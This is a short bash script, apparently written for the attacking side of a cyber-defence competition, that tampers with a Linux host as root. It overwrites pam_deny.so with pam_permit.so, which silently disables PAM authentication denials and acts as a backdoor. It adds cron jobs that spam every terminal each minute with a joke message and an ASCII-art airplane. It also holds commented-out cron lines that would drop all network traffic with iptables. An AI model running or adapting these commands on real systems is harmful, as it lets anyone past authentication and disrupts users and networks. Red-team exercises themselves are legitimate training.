#!/bin/bash
# Jenna Weinman

# remove pam_deny.so file
rm /lib/x86_64-linux-gnu/security/pam_deny.so

# copy pam_permit.so file to create new pam_deny.so file
cp /lib/x86_64-linux-gnu/security/pam_permit.so /lib/x86_64-linux-gnu/security/pam_deny.so

# add funny cron job to disrupt the terminal (doesn't always work on gnome terminals)
echo "* * * * * root /usr/bin/wall So how about that airplane food?" >> /etc/cron.d/per_minute

# create ascii art file
echo "   @@@@@@@@
     @@@@@@@@@@@
        @@@@@@@@@@@@@
           @@@@@@@@@@@@@@
              @@@@@@@@@@@@@@@
                @@@@@@@@@@@@@@@@@@@            @@@@@@@@@@@
 @      @@@@@      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@  @@@@@@       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
         @@@@                 @@@@@@@@@@
          @@@                   @@@@@@@@
                                @@@@@@@
                                @@@@@@
                                @@@@@
                                @@@@" >> /etc/cron.d/plane.txt

# add ascii art into funny cron job
echo "* * * * * root /usr/bin/wall /etc/cron.d/plane.txt" >> /etc/cron.d/per_minute

# drop all traffic break (not to be used until later in the competition)
# echo "* * * * * root usr/bin/iptables -t mangle -A INPUT -j DROP" >> /etc/cron.d/per_hour
# echo "* * * * * root usr/bin/iptables -t mangle -A OUTPUT -j DROP" >> /etc/cron.d/per_hour